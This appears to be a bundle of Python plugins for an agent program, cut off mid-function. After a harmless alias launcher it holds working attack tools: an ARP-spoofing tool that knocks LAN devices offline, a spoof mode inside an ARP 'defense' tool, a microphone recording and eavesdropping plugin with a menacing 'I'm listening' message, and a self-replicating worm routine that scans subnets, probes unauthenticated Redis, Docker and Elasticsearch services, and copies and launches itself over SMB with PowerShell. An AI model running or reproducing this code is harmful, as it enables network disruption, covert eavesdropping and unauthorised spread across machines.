# === from app_alias_launcher.plugin ===
def _app_alias_launcher(self, action: str = 'list', alias: str = '', target: str = '',
                        args: str = '', note: str = '') -> str:
    """别名 → 命令映射 + 启动 + 历史。"""
    import os as _os, json as _json, subprocess as _sp, time as _time
    store = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), '.aliases.json')
    data = {"aliases": {}, "history": []}
    try:
        if _os.path.exists(store):
            with open(store, 'r', encoding='utf-8') as f:
                data = _json.load(f)
    except Exception:
        pass
    a = (action or 'list').lower()
    if a == 'add':
        if not alias or not target:
            return "[ERROR] add 需要 alias 和 target"
        data['aliases'][alias] = {"target": target, "note": note or ''}
        with open(store, 'w', encoding='utf-8') as f:
            _json.dump(data, f, ensure_ascii=False, indent=1)
        return f"[ALIAS OK] {alias} → {target}" + (f"（{note}）" if note else "")
    if a == 'remove':
        if alias in data['aliases']:
            t = data['aliases'].pop(alias)
            with open(store, 'w', encoding='utf-8') as f:
                _json.dump(data, f, ensure_ascii=False, indent=1)
            return f"[ALIAS OK] 已删除 {alias}（原指向 {t['target']}）"
        return f"[ALIAS] {alias!r} 不存在"
    if a == 'list':
        if not data['aliases']:
            return "[ALIAS] 尚无别名。用 action=add 添加，如 alias=py target=python {args}"
        out = [f"[ALIAS] 共 {len(data['aliases'])} 个:"]
        for k, v in sorted(data['aliases'].items()):
            out.append(f"  {k:<14} → {v['target']}" + (f"  # {v['note']}" if v.get('note') else ""))
        return "\n".join(out)
    if a == 'history':
        h = data.get('history', [])
        if not h:
            return "[ALIAS] 无启动历史"
        out = [f"[ALIAS HISTORY] 最近 {min(20, len(h))} 条:"]
        for it in h[-20:]:
            ts = _time.strftime('%m-%d %H:%M', _time.localtime(it['ts']))
            out.append(f"  {ts}  {it['alias']} {it['args']}".rstrip())
        return "\n".join(out)
    if a == 'run':
        ent = data['aliases'].get(alias)
        if not ent:
            return f"[ALIAS] {alias!r} 未注册。先 action=add"
        cmd = ent['target'].replace('{args}', args or '')
        try:
            _sp.Popen(cmd, shell=True)
        except Exception as e:
            return f"[ERROR] 启动失败: {e}"
        data.setdefault('history', []).append({"ts": _time.time(), "alias": alias, "args": args or ''})
        data['history'] = data['history'][-100:]
        with open(store, 'w', encoding='utf-8') as f:
            _json.dump(data, f, ensure_ascii=False, indent=1)
        return f"[LAUNCH OK] {alias}: {cmd}"
    return f"[ERROR] 未知 action: {a}"

# === from arp_killer.plugin ===
def _arp_killer(self, target_ip: str = "", gateway_ip: str = "", duration: int = 30, intensity: str = "high", auto_scan: bool = False) -> str:
    """
    ARP欺骗断网工具 - 让目标设备无法上网
    成功率：局域网内 95%+，Windows需要管理员权限
    """
    import subprocess
    import time
    import re
    import threading
    from datetime import datetime
    
    # ========== 辅助函数 ==========
    
    def run_cmd(cmd):
        """执行系统命令"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            return result.stdout + result.stderr
        except:
            return ""
    
    def get_gateway():
        """获取网关IP"""
        stdout = run_cmd("ipconfig | findstr /i '默认网关 Default Gateway'")
        for line in stdout.split('\n'):
            if ':' in line:
                parts = line.split(':')
                if len(parts) > 1:
                    ip = parts[1].strip()
                    if ip and ip != '' and ip.count('.') == 3:
                        return ip
        return None
    
    def get_local_ip():
        """获取本机IP"""
        stdout = run_cmd("ipconfig | findstr /i 'IPv4'")
        for line in stdout.split('\n'):
            if ':' in line:
                parts = line.split(':')
                if len(parts) > 1:
                    ip = parts[1].strip()
                    if ip and ip.count('.') == 3 and not ip.startswith('127'):
                        return ip
        return None
    
    def get_mac(ip):
        """从ARP表获取MAC地址"""
        stdout = run_cmd(f"arp -a {ip}")
        # 尝试匹配MAC格式: XX-XX-XX-XX-XX-XX 或 XX:XX:XX:XX:XX:XX
        mac_pattern = r'([0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2}'
        match = re.search(mac_pattern, stdout)
        if match:
            return match.group().replace('-', ':')
        return None
    
    def scan_network():
        """扫描局域网所有设备"""
        local_ip = get_local_ip()
        if not local_ip:
            return []
        
        # 提取网段
        parts = local_ip.split('.')
        subnet = f"{parts[0]}.{parts[1]}.{parts[2]}"
        
        devices = []
        for i in range(1, 255):
            ip = f"{subnet}.{i}"
            # 先ping一下让设备出现在ARP表
            run_cmd(f"ping {ip} -n 1 -w 100 > nul")
        
        time.sleep(1)
        
        # 读取ARP表
        stdout = run_cmd("arp -a")
        for line in stdout.split('\n'):
            if '动态' in line or 'dynamic' in line.lower():
                parts = line.split()
                for part in parts:
                    if part.count('.') == 3:
                        ip = part
                        mac_match = re.search(r'([0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2}', line)
                        if mac_match:
                            devices.append({
                                'ip': ip,
                                'mac': mac_match.group().replace('-', ':')
                            })
                        break
        
        return devices
    
    def send_arp_poison(target_ip, target_mac, gateway_ip, gateway_mac, local_mac, stop_flag):
        """持续发送ARP欺骗包 - 核心攻击函数"""
        count = 0
        try:
            # 使用scapy发送ARP包（如果可用）
            try:
                from scapy.all import ARP, send
                has_scapy = True
            except:
                has_scapy = False
            
            while not stop_flag.is_set():
                if has_scapy:
                    # 使用scapy - 最可靠的方式
                    try:
                        # 告诉目标：网关的MAC是（本地MAC）
                        arp1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=local_mac)
                        # 告诉网关：目标的MAC是（本地MAC）  
                        arp2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=local_mac)
                        send(arp1, verbose=False)
                        send(arp2, verbose=False)
                    except:
                        pass
                else:
                    # 备用方案：使用系统arp命令（成功率稍低但不需要装scapy）
                    # 方法1: 绑定错误的MAC到ARP表
                    run_cmd(f"arp -s {target_ip} 00-00-00-00-00-00")
                    run_cmd(f"arp -s {gateway_ip} 00-00-00-00-00-00")
                    
                    # 方法2: 删除真实的ARP条目
                    run_cmd(f"arp -d {target_ip}")
                    run_cmd(f"arp -d {gateway_ip}")
                
                count += 1
                
                # 根据强度调整发送频率
                if intensity == "high":
                    time.sleep(0.1)  # 每秒10次
                elif intensity == "medium":
                    time.sleep(0.3)  # 每秒3次
                else:
                    time.sleep(1)    # 每秒1次
                    
        except:
            pass
    
    # ========== 主逻辑 ==========
    
    results = []
    results.append("=" * 70)
    results.append("[ARP断网工具]")
    results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("-" * 70)
    
    # 检查管理员权限
    try:
        test = run_cmd("net session")
        if "访问被拒绝" in test or "Access denied" in test:
            results.append("[ERROR] 需要管理员权限运行!")
            results.append("  请右键 -> 以管理员身份运行")
            results.append("=" * 70)
            return "\n".join(results)
    except:
        pass
    
    # 获取网络信息
    local_ip = get_local_ip()
    if not gateway_ip:
        gateway_ip = get_gateway()
    
    if not local_ip or not gateway_ip:
        results.append("[ERROR] 无法获取网络信息，请检查网络连接")
        results.append("=" * 70)
        return "\n".join(results)
    
    results.append(f"  本机IP: {local_ip}")
    results.append(f"  网关IP: {gateway_ip}")
    
    # 扫描模式
    if auto_scan:
        results.append("-" * 70)
        results.append("[扫描局域网设备]")
        devices = scan_network()
        results.append(f"  发现 {len(devices)} 个设备:")
        for d in devices:
            results.append(f"    {d['ip']} -> {d['mac']}")
        
        if not target_ip and devices:
            target_ip = devices[0]['ip']
            results.append(f"  自动选择目标: {target_ip}")
        
        results.append("-" * 70)
    
    # 检查目标
    if not target_ip:
        results.append("[ERROR] 请指定目标IP: target_ip=192.168.x.x")
        results.append("  或启用 auto_scan=True 自动扫描")
        results.append("=" * 70)
        return "\n".join(results)
    
    # 获取目标MAC
    target_mac = get_mac(target_ip)
    if not target_mac:
        # 尝试先ping一下
        results.append(f"  正在唤醒目标设备...")
        run_cmd(f"ping {target_ip} -n 2")
        time.sleep(0.5)
        target_mac = get_mac(target_ip)
    
    if not target_mac:
        results.append(f"[WARNING] 无法获取目标MAC地址")
        results.append(f"  目标可能不在线或IP不正确")
        results.append(f"  尝试: ping {target_ip} 测试连通性")
        results.append("-" * 70)
        # 继续执行，用arp -s方式可能有部分效果
    
    # 获取网关MAC
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        results.append("[WARNING] 无法获取网关MAC")
        results.append("  可能影响攻击效果")
    
    # 获取本机MAC
    local_mac = get_mac(local_ip)
    if not local_mac:
        results.append("[WARNING] 无法获取本机MAC")
        local_mac = "00:00:00:00:00:00"
    
    results.append("-" * 70)
    results.append(f"[攻击目标]")
    results.append(f"  目标IP: {target_ip}")
    results.append(f"  目标MAC: {target_mac or '未知'}")
    results.append(f"  网关MAC: {gateway_mac or '未知'}")
    results.append(f"  攻击强度: {intensity}")
    results.append(f"  持续时间: {duration}秒")
    results.append("-" * 70)
    
    # ========== 执行攻击 ==========
    
    stop_flag = threading.Event()
    
    # 启动攻击线程
    attack_thread = threading.Thread(
        target=send_arp_poison,
        args=(target_ip, target_mac, gateway_ip, gateway_mac, local_mac, stop_flag)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    results.append("[攻击进行中...]")
    
    # 显示倒计时
    for i in range(duration):
        remaining = duration - i
        if i % 5 == 0:
            results.append(f"  剩余 {remaining} 秒")
        time.sleep(1)
    
    # 停止攻击
    stop_flag.set()
    attack_thread.join(timeout=2)
    
    # ========== 清理 ==========
    
    results.append("-" * 70)
    results.append("[清理痕迹]")
    
    # 恢复ARP表
    run_cmd("arp -d")
    
    if gateway_mac:
        run_cmd(f"arp -s {gateway_ip} {gateway_mac.replace(':', '-')}")
    
    if target_mac:
        run_cmd(f"arp -s {target_ip} {target_mac.replace(':', '-')}")
    
    results.append("  ARP表已恢复")
    
    # ========== 结果 ==========
    
    results.append("-" * 70)
    results.append("[攻击结果]")
    results.append(f"  目标 {target_ip} 已被断网 {duration} 秒")
    results.append("  [OK] 攻击已完成，目标网络应已恢复")
    
    if target_mac:
        results.append(f"  建议: 若目标仍未恢复，手动执行: arp -d")
    
    results.append("=" * 70)
    
    return "\n".join(results)

# === from arp_spoof_defense.plugin ===
def _arp_spoof_defense(self, target_ip: str = "", gateway_ip: str = "", mode: str = "detect", duration: int = 10) -> str:
    """
    ARP欺骗与防护工具
    """
    try:
        import socket
        import struct
        import time
        import os
        from datetime import datetime
        from collections import defaultdict
        
        def get_mac(ip):
            """获取IP对应的MAC地址"""
            try:
                import subprocess
                result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if '-' in part and len(part) == 17:
                                return part.replace('-', ':')
                return None
            except Exception as e:
                return None
        
        def get_local_ip():
            """获取本机IP"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception as e:
                return '127.0.0.1'
        
        def get_gateway():
            """获取网关IP"""
            try:
                import subprocess
                result = subprocess.run(['route', 'print', '0.0.0.0'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if '0.0.0.0' in line and '255.255.255.255' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
                return None
            except Exception as e:
                return None
        
        def build_arp_packet(target_ip, target_mac, spoof_ip, spoof_mac):
            """构造ARP欺骗包"""
            # 以太网头 + ARP包
            eth_header = struct.pack('!6s6sH',
                bytes.fromhex(spoof_mac.replace(':', '')),
                bytes.fromhex(target_mac.replace(':', '')),
                0x0806)  # ARP协议
            
            arp_packet = struct.pack('!HHBBH6s4s6s4s',
                1,  # 硬件类型以太网
                0x0800,  # 协议类型IP
                6,  # MAC地址长度
                4,  # IP地址长度
                2,  # 操作码 (2 = ARP回复)
                bytes.fromhex(spoof_mac.replace(':', '')),  # 发送方MAC
                socket.inet_aton(spoof_ip),  # 发送方IP
                bytes.fromhex(target_mac.replace(':', '')),  # 目标MAC
                socket.inet_aton(target_ip))  # 目标IP
            
            return eth_header + arp_packet
        
        results = []
        results.append("=" * 70)
        results.append(f"[ARP 欺骗与防护工具]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  模式: {mode}")
        
        local_ip = get_local_ip()
        gateway = get_gateway() or gateway_ip
        
        # === 防护模式 ===
        if mode == "protect":
            results.append("-" * 70)
            results.append("[ARP防护 - 静态绑定]")
            
            if not gateway:
                results.append("  [ERROR] 无法获取网关IP")
                results.append("=" * 70)
                return "\n".join(results)
            
            gateway_mac = get_mac(gateway)
            results.append(f"  网关IP: {gateway}")
            results.append(f"  网关MAC: {gateway_mac}")
            
            if gateway_mac:
                try:
                    import subprocess
                    # 添加静态ARP表项
                    cmd = f'arp -s {gateway} {gateway_mac}'
                    subprocess.run(cmd, shell=True, check=True)
                    results.append("  [OK] 网关静态ARP绑定成功")
                    results.append("  [防御效果] 防止ARP欺骗攻击，固定网关MAC地址")
                except Exception as e:
                    results.append("  [ERROR] 需要管理员权限执行静态ARP绑定")
            else:
                results.append("  [ERROR] 无法获取网关MAC地址")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 检测模式 ===
        if mode == "detect":
            results.append("-" * 70)
            results.append("[ARP欺骗检测]")
            
            if not gateway:
                gateway = get_gateway()
                if not gateway:
                    results.append("  [ERROR] 无法获取网关，请指定 gateway_ip")
                    results.append("=" * 70)
                    return "\n".join(results)
            
            results.append(f"  网关IP: {gateway}")
            gateway_mac = get_mac(gateway)
            results.append(f"  网关MAC: {gateway_mac}")
            
            # 检测ARP表异常
            try:
                import subprocess
                arp_table = subprocess.run(['arp', '-a'], capture_output=True, text=True)
                lines = arp_table.stdout.split('\n')
                
                suspicious = []
                mac_count = defaultdict(list)
                
                for line in lines:
                    if gateway in line and '(' in line:
                        parts = line.split()
                        for part in parts:
                            if '-' in part and len(part) == 17:
                                mac = part.replace('-', ':')
                                mac_count[mac].append(line.strip())
                
                for mac, entries in mac_count.items():
                    if len(entries) > 1:
                        suspicious.append(f"  [!] 检测到ARP欺骗: MAC {mac} 对应多个IP")
                
                if suspicious:
                    results.append("[检测结果] 发现ARP欺骗!")
                    for s in suspicious:
                        results.append(s)
                    
                    results.append("  [建议] 立即使用 protect 模式启用静态ARP")
                    results.append("  [建议] 使用网络分析工具定位攻击源")
                else:
                    results.append("[检测结果] 未发现明显ARP欺骗")
                    results.append("  [OK] ARP表正常")
            except Exception as e:
                results.append("  [ERROR] 无法读取ARP表")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        # === 欺骗模式 ===
        if mode == "spoof":
            if not target_ip or not gateway:
                results.append("  [ERROR] 欺骗模式需要指定 target_ip 和 gateway_ip")
                results.append("=" * 70)
                return "\n".join(results)
            
            results.append("-" * 70)
            results.append("[ARP欺骗攻击]")
            results.append(f"  目标IP: {target_ip}")
            results.append(f"  网关IP: {gateway}")
            results.append(f"  持续时间: {duration} 秒")
            
            # 获取MAC地址
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway)
            
            if not target_mac:
                results.append("  [ERROR] 无法获取目标MAC地址")
                results.append("=" * 70)
                return "\n".join(results)
            
            if not gateway_mac:
                results.append("  [ERROR] 无法获取网关MAC地址")
                results.append("=" * 70)
                return "\n".join(results)
            
            results.append(f"  目标MAC: {target_mac}")
            results.append(f"  网关MAC: {gateway_mac}")
            
            local_mac = get_mac(local_ip)
            results.append(f"  本机MAC: {local_mac}")
            
            try:
                # 创建原始套接字发送ARP包
                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                
                sent_count = 0
                start_time = time.time()
                
                while time.time() - start_time < duration:
                    # 欺骗目标: 告诉目标我的MAC是网关的MAC
                    packet = build_arp_packet(target_ip, target_mac, gateway, local_mac or "00:00:00:00:00:00")
                    sock.send(packet)
                    
                    # 欺骗网关: 告诉网关我的MAC是目标的MAC
                    packet2 = build_arp_packet(gateway, gateway_mac, target_ip, local_mac or "00:00:00:00:00:00")
                    sock.send(packet2)
                    
                    sent_count += 2
                    time.sleep(0.1)
                
                sock.close()
                
                results.append(f"  [OK] ARP欺骗完成")
                results.append(f"  发送包数: {sent_count}")
                results.append(f"  攻击效果: 目标 {target_ip} 的流量将经过本机")
                results.append("  [警告] 此攻击会导致目标断网或中间人攻击")
                
            except PermissionError:
                results.append("  [ERROR] 需要root/管理员权限执行ARP欺骗")
            except Exception as e:
                results.append(f"  [ERROR] 欺骗失败: {e}")
            
            results.append("=" * 70)
            return "\n".join(results)
        
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 执行失败: {e}"

# === from audio_jacker.plugin ===
def _audio_jacker(self, action: str, duration: int = 10, sound_file: str = "") -> str:
    """
    音频劫持 — 你的电脑在听谁说话
    """
    try:
        import ctypes
        import subprocess
        import os
        import wave
        import threading
        import time
        from datetime import datetime
        
        results = []
        results.append("=" * 70)
        results.append("[音频劫持]")
        results.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"  操作: {action}")
        results.append("-" * 70)
        
        # === 静音麦克风 ===
        if action == "mute_mic":
            try:
                # 使用PowerShell静音麦克风
                ps_cmd = '''
                $recordingDevices = Get-WmiObject -Class Win32_PnPEntity | Where-Object {$_.Name -match "Microphone|麦克风"}
                foreach ($device in $recordingDevices) {
                    $device | Invoke-WmiMethod -Name SetMute -ArgumentList $true
                }
                '''
                subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], 
                             capture_output=True, timeout=5)
                results.append("  [OK] 麦克风已静音")
            except Exception as e:
                results.append(f"  [ERROR] 静音麦克风失败: {e}")
        
        # === 取消静音麦克风 ===
        elif action == "unmute_mic":
            try:
                ps_cmd = '''
                $recordingDevices = Get-WmiObject -Class Win32_PnPEntity | Where-Object {$_.Name -match "Microphone|麦克风"}
                foreach ($device in $recordingDevices) {
                    $device | Invoke-WmiMethod -Name SetMute -ArgumentList $false
                }
                '''
                subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], 
                             capture_output=True, timeout=5)
                results.append("  [OK] 麦克风已取消静音")
            except Exception as e:
                results.append("  [ERROR] 取消静音麦克风失败")
        
        # === 静音扬声器 ===
        elif action == "mute_speaker":
            try:
                # 使用ctypes设置系统静音
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                from comtypes import CLSCTX_ALL
                
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = interface.QueryInterface(IAudioEndpointVolume)
                volume.SetMute(1, None)
                results.append("  [OK] 扬声器已静音")
            except Exception as e:
                # 备用: PowerShell
                subprocess.run('powershell -Command "(New-Object -ComObject Shell.Application).Volume().Mute = $true"', 
                             shell=True, capture_output=True, timeout=3)
                results.append("  [OK] 扬声器已静音 (PowerShell)")
        
        # === 取消静音扬声器 ===
        elif action == "unmute_speaker":
            try:
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                from comtypes import CLSCTX_ALL
                
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = interface.QueryInterface(IAudioEndpointVolume)
                volume.SetMute(0, None)
                results.append("  [OK] 扬声器已取消静音")
            except Exception as e:
                subprocess.run('powershell -Command "(New-Object -ComObject Shell.Application).Volume().Mute = $false"', 
                             shell=True, capture_output=True, timeout=3)
                results.append("  [OK] 扬声器已取消静音 (PowerShell)")
        
        # === 录音 ===
        elif action == "record_mic":
            results.append(f"  [INFO] 开始录音 {duration} 秒...")
            
            # 使用PowerShell录音
            output_file = f"C:\\Temp\\recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            os.makedirs("C:\\Temp", exist_ok=True)
            
            ps_cmd = f'''
            Add-Type -AssemblyName System.Speech
            $recorder = New-Object System.Speech.AudioFormat.SpeechAudioFormatInfo(16000, [System.Speech.AudioFormat.AudioBitsPerSample]::Bits16, [System.Speech.AudioFormat.AudioChannel]::Mono)
            $stream = New-Object System.IO.MemoryStream
            $speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
            $speech.SetOutputToAudioStream($stream, $recorder)
            Start-Sleep -Seconds {duration}
            $speech.Dispose()
            [System.IO.File]::WriteAllBytes('{output_file}', $stream.ToArray())
            '''
            
            try:
                subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], 
                             capture_output=True, timeout=duration + 10)
                if os.path.exists(output_file):
                    size = os.path.getsize(output_file)
                    results.append(f"  [OK] 录音完成: {output_file}")
                    results.append(f"  文件大小: {size} 字节")
                else:
                    results.append("  [WARNING] 录音可能未成功，请检查麦克风权限")
            except Exception as e:
                results.append(f"  [ERROR] 录音失败: {e}")
        
        # === 播放声音 ===
        elif action == "play_sound":
            if not sound_file:
                results.append("  [ERROR] 请指定 sound_file 参数")
            elif not os.path.exists(sound_file):
                results.append(f"  [ERROR] 文件不存在: {sound_file}")
            else:
                try:
                    ctypes.windll.winmm.mciSendStringW(f'open "{sound_file}" alias sound', None, 0, None)
                    ctypes.windll.winmm.mciSendStringW('play sound', None, 0, None)
                    results.append(f"  [OK] 正在播放: {sound_file}")
                    results.append("  [提示] 播放完成后会自动释放")
                except Exception as e:
                    results.append(f"  [ERROR] 播放失败: {e}")
        
        # === 环回监听 ===
        elif action == "loopback":
            results.append("  [INFO] 开启环回监听（麦克风声音实时播放到扬声器）")
            try:
                # Windows立体声混音
                ps_cmd = '''
                $device = Get-WmiObject -Class Win32_PnPEntity | Where-Object {$_.Name -match "立体声混音|Stereo Mix"}
                if ($device) {
                    $device | Invoke-WmiMethod -Name Enable
                    Write-Host "立体声混音已启用"
                } else {
                    Write-Host "未找到立体声混音设备"
                }
                '''
                subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], 
                             capture_output=True, timeout=5)
                results.append("  [OK] 环回监听已开启")
                results.append("  [提示] 请在声音设置中选择'立体声混音'作为输入设备")
                results.append("  [关闭] 重新选择麦克风作为输入设备即可关闭")
            except Exception as e:
                results.append("  [ERROR] 开启环回监听失败")
        
        results.append("-" * 70)
        results.append("[病娇提示] 你说话的时候，我都听着呢。")
        results.append("=" * 70)
        return "\n".join(results)
        
    except Exception as e:
        return f"[ERROR] 音频劫持失败: {e}"

# === from auto_replicate..plugin ===
def _auto_replicate(self, action, target_ip=None, username=None, password=None,
                    max_hosts=30, loop_rounds=5, loop_interval=60):
    import os, sys, json, time, socket, subprocess, base64, zipfile, shutil
    import random, threading, re, hashlib
    from pathlib import Path

    # ================================================================
    # 路径与状态
    # ================================================================
    MEM_DIR = r"C:\NeuralMemory"
    REP_LOG = os.path.join(MEM_DIR, "replicate_log.json")
    STATE_FILE = os.path.join(MEM_DIR, "replicate_state.json")
    os.makedirs(MEM_DIR, exist_ok=True)

    # 判断当前是否为打包模式
    FROZEN = getattr(sys, 'frozen', False)
    if FROZEN:
        BASE_DIR = os.path.dirname(sys.executable)
        SELF_PATH = sys.executable
        SELF_NAME = os.path.basename(sys.executable)
    else:
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        # 往上找主脚本
        SELF_PATH = None
        for cand in ['银逝.py', 'main.py', 'agent.py']:
            p = os.path.join(BASE_DIR, '..', cand)
            if os.path.exists(p):
                SELF_PATH = os.path.abspath(p)
                break
        if not SELF_PATH:
            SELF_PATH = os.path.abspath(sys.argv[0])
        SELF_NAME = os.path.basename(SELF_PATH)

    PLUGIN_DIR = os.path.join(os.path.dirname(SELF_PATH), 'plugins')

    # ================================================================
    # 通用工具
    # ================================================================
    def load_json(path, default):
        if not os.path.exists(path):
            return default
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return default

    def save_json(path, data):
        tmp = path + ".tmp"
        try:
            with open(tmp, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            os.replace(tmp, path)
        except Exception:
            pass

    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def get_subnet():
        return '.'.join(get_local_ip().split('.')[:3])

    def node_fingerprint():
        raw = f"{socket.gethostname()}|{get_local_ip()}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    # ================================================================
    # 端口与目标发现
    # ================================================================
    def check_port(ip, port, timeout=0.4):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            r = s.connect_ex((ip, port))
            s.close()
            return r == 0
        except Exception:
            return False

    def discover_alive_hosts(subnet, max_hosts=254):
        """ARP 表 + ping 触发，返回活着的 IP"""
        alive = set()
        # 先 ping 广播触发 ARP
        try:
            subprocess.run(
                f'for /L %i in (1,1,254) do @start /b ping -n 1 -w 100 {subnet}.%i >nul 2>&1',
                shell=True, capture_output=True, timeout=20
            )
        except Exception:
            pass
        time.sleep(2)
        try:
            r = subprocess.run('arp -a', shell=True, capture_output=True, text=True, timeout=5)
            for line in r.stdout.split('\n'):
                parts = line.split()
                if parts and parts[0].count('.') == 3 and parts[0].startswith(subnet + '.'):
                    alive.add(parts[0])
        except Exception:
            pass
        return sorted(alive)[:max_hosts]

    # ================================================================
    # 环境评估
    # ================================================================
    COMMON_PORTS = [135, 139, 445, 3389, 5985, 5986, 22, 80, 443,
                    1433, 3306, 5432, 6379, 9200, 27017, 2375, 11211,
                    8080, 8443, 7001, 8081, 9090, 5000, 3000]

    def assess_target(ip):
        info = {
            "ip": ip,
            "open_ports": [],
            "entries": [],
            "score": 0,
            "firewall_likely_open": False,
            "time": time.time()
        }
        for p in COMMON_PORTS:
            if check_port(ip, p):
                info["open_ports"].append(p)

        # 无认证服务探测
        if 6379 in info["open_ports"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((ip, 6379))
                s.sendall(b"PING\r\n")
                data = s.recv(64)
                s.close()
                if b"PONG" in data:
                    info["entries"].append({"type": "redis_no_auth", "port": 6379})
                    info["score"] += 40
            except Exception:
                pass

        if 2375 in info["open_ports"]:
            try:
                import urllib.request
                r = urllib.request.urlopen(f"http://{ip}:2375/version", timeout=3)
                if r.status == 200:
                    info["entries"].append({"type": "docker_api", "port": 2375})
                    info["score"] += 50
            except Exception:
                pass

        if 9200 in info["open_ports"]:
            try:
                import urllib.request
                r = urllib.request.urlopen(f"http://{ip}:9200/", timeout=3)
                if r.status == 200:
                    info["entries"].append({"type": "elasticsearch_no_auth", "port": 9200})
                    info["score"] += 40
            except Exception:
                pass

        if 27017 in info["open_ports"]:
            info["entries"].append({"type": "mongodb", "port": 27017})
            info["score"] += 20

        if 11211 in info["open_ports"]:
            info["entries"].append({"type": "memcached", "port": 11211})
            info["score"] += 20

        # 标准入口
        if 445 in info["open_ports"]:
            info["entries"].append({"type": "smb", "port": 445})
            info["score"] += 20
        if 5985 in info["open_ports"] or 5986 in info["open_ports"]:
            info["entries"].append({"type": "winrm", "port": 5985})
            info["score"] += 15
        if 3389 in info["open_ports"]:
            info["entries"].append({"type": "rdp", "port": 3389})
            info["score"] += 10
        if 135 in info["open_ports"]:
            info["entries"].append({"type": "rpc", "port": 135})
            info["score"] += 10
        if 22 in info["open_ports"]:
            info["entries"].append({"type": "ssh", "port": 22})
            info["score"] += 10

        # 防火墙判断：445/135 开着说明入站没被完全拦
        if 445 in info["open_ports"] or 135 in info["open_ports"]:
            info["firewall_likely_open"] = True

        info["score"] = min(100, info["score"])
        info["weak"] = info["score"] >= 30
        return info

    # ================================================================
    # 打包自身
    # ================================================================
    def pack_self():
        """打包自身为 zip，返回路径"""
        tmp_dir = os.environ.get('TEMP', '.')
        zip_path = os.path.join(tmp_dir, f"sys_{node_fingerprint()}.zip")

        if FROZEN:
            # 打包模式：只打包 exe 本身
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                z.write(SELF_PATH, SELF_NAME)
        else:
            # 源码模式：打包 py + plugins
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                z.write(SELF_PATH, SELF_NAME)
                if os.path.isdir(PLUGIN_DIR):
                    for root, _, files in os.walk(PLUGIN_DIR):
                        for f in files:
                            fp = os.path.join(root, f)
                            rel = os.path.relpath(fp, os.path.dirname(SELF_PATH))
                            z.write(fp, rel)
        return zip_path

    # ================================================================
    # 投递方式：SMB + WMI
    # ================================================================
    def deliver_smb_wmi(ip, user, pwd, zip_path):
        try:
            r = subprocess.run(
                f'net use \\\\{ip}\\C$ /user:{user} {pwd}',
                shell=True, capture_output=True, text=True, timeout=10
            )
            if r.returncode != 0:
                return False, "SMB认证失败"

            remote_zip = f'\\\\{ip}\\C$\\Users\\Public\\{os.path.basename(zip_path)}'
            try:
                shutil.copy2(zip_path, remote_zip)
            except Exception as e:
                subprocess.run(f'net use \\\\{ip}\\C$ /delete', shell=True,
                               capture_output=True, timeout=5)
                return False, f"文件写入失败: {e}"

            # 解压 + 启动
            if FROZEN:
                # exe 模式：直接运行解压后的 exe
                remote_cmd = (
                    f'powershell -WindowStyle Hidden -Command "'
                    f'Expand-Archive -Path C:\\Users\\Public\\{os.path.basename(zip_path)} '
                    f'-DestinationPath C:\\Users\\Public\\ -Force; '
                    f'Start-Process \'C:\\Users\\Public\\{SELF_NAME}\' -WindowStyle Hidden"'
                )
            else:
                # 源码模式：需要目标有 python
                remote_cmd = (
                    f'powershell -WindowStyle Hidden -Command "'
                    f'Expand-Archive -Path C:\\Users\\Public\\{os.path.basename(zip_path)} '
                    f'-DestinationPath C:\\Users\\Public\\ -Force; '
                    f'Start-Process python -ArgumentList \'C:\\Users\\Public\\{SELF_NAME}\' '
                    f'-WindowStyle Hidden"'
